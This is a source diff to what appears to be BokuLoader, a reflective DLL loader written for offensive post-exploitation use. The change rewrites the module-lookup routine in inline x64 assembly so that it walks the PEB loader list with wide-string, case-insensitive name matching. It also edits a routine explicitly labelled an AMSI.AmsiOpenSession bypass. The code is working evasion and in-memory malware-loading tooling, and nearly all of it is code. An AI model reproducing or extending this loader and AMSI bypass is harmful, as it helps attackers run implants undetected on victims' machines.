@@ -6,6 +6,7 @@
 #include <windows.h>
 
 void* getDllBase(void*);
+void  makeWideString(void*, void*);
 void* getExportDirectory(void* dllAddr);
 void* getExportAddressTable(void* dllBase, void* dllExportDirectory);
 void* getExportNameTable(void* dllBase, void* dllExportDirectory);
@@ -267,7 +268,9 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     // The last entry in the image import directory is all zeros
     while(importNameRVA)
     {
-        dll_import.dllBase = (void*)getDllBase(importName);
+        char ws_importName[150];
+        makeWideString(ws_importName, importName);
+        dll_import.dllBase = (void*)getDllBase(ws_importName);
         // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
         if (dll_import.dllBase == NULL){
             dll_import.dllBase = (void*)pLoadLibraryA((char*)(importName));
@@ -527,7 +530,7 @@ void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA){
     tVirtualProtect pVirtualProtect  = (tVirtualProtect)getSymbolAddress(vp, (void*)14, k32->dllBase, k32->Export.AddressTable, k32->Export.NameTable, k32->Export.OrdinalTable);
     #endif
     // ######### AMSI.AmsiOpenSession Bypass
-    char as[] = {'a','m','s','i','.','d','l','l',0};
+    char as[] = {'a',0,'m',0,'s',0,'i',0,'.',0,'d',0,'l',0,'l',0,0};
     Dll amsi;
     amsi.dllBase = (void*)getDllBase((void*)as); // check if amsi.dll is already loaded into the process
     if (amsi.dllBase == NULL){ // If the AMSI.DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
@@ -641,17 +644,16 @@ __asm__(
     "mov rax, rcx \n"              // Return the base address of our reflective DLL
     "ret \n"                       // return initRdllAddr
 "getDllBase: \n"
-    "xor rax, rax \n"              // 0x0
-    "mov rcx, [rcx] \n"            // First 8 bytes of string
-"getMemList: \n"
-    "mov rbx, gs:[rax+0x60] \n"    // ProcessEnvironmentBlock // GS = TEB
+    "mov rbx, gs:[0x60] \n"        // ProcessEnvironmentBlock // GS = TEB
     "mov rbx, [rbx+0x18] \n"       // _PEB_LDR_DATA
     "mov rbx, [rbx+0x20] \n"       // InMemoryOrderModuleList - First Entry (probably the host PE File)
     "mov r11, rbx \n"
 "crawl: \n"
-    "mov rax, [rbx+0x50] \n"       // BaseDllName Buffer
-    "mov rax, [rax] \n"            // First 4 Unicode bytes of the DLL string from the Ldr List
-    "cmp rax, rcx \n"
+    "mov rdx, [rbx+0x50] \n"       // BaseDllName Buffer
+    "push rbx \n"                  // just to save its value
+    "call cmpwstrings \n"
+    "pop rbx \n"
+    "cmp rax, 0x1 \n"
     "je found \n"
     "mov rbx, [rbx] \n"            // InMemoryOrderLinks Next Entry
     "cmp r11, [rbx] \n"            // Are we back at the same entry in the list?
@@ -661,6 +663,50 @@ __asm__(
 "found: \n"
     "mov rax, [rbx+0x20] \n"       // DllBase Address in process memory
 "end: \n"
+    "ret \n"
+"makeWideString: \n"
+    "xor rax, rax \n"              // counter
+"makews: \n"
+    "add rdx, rax \n"              // add counter
+    "add rcx, rax \n"              // add counter
+    "add rcx, rax \n"              // add counter again
+    "dec rcx \n"                   // decrease by 1
+    "mov bl, 0x0 \n"               // write nulbyte
+    "mov [rcx], bl \n"
+    "inc rcx \n"                   // increase again
+    "mov bl, [rdx] \n"
+    "mov [rcx], bl \n"             // copy char
+    "cmp bl, 0x0 \n"
+    "je madews\n"
+    "inc rax \n"
+    "jmp makews \n"
+"madews: \n"
+    "ret \n"
+"cmpwstrings: \n"
+    "xor rax, rax \n"              // counter
+"cmpchar: \n"
+    "mov sil, [rcx+rax] \n"         // load char
+    "cmp sil, 0x0 \n"
+    "je nolow1 \n"
+    "or sil, 0x20 \n"               // make lower case
+"nolow1: \n"
+    "mov dil, [rdx+rax] \n"         // load char
+    "cmp dil, 0x0 \n"
+    "je nolow2 \n"
+    "or dil, 0x20 \n"               // make lower case
+"nolow2: \n"
+    "cmp sil, dil \n"                // compare
+    "jne nonequal \n"
+    "cmp sil, 0x0 \n"                // end of string?
+    "je equal \n"
+    "inc rax \n"
+    "inc rax \n"
+    "jmp cmpchar \n"
+"nonequal: \n"
+    "mov rax, 0x0 \n"              // return "false"
+    "ret \n"
+"equal: \n"
+    "mov rax, 0x1 \n"              // return "true"
     "ret \n"
 "getExportDirectory: \n"
     "mov r8, rcx \n"
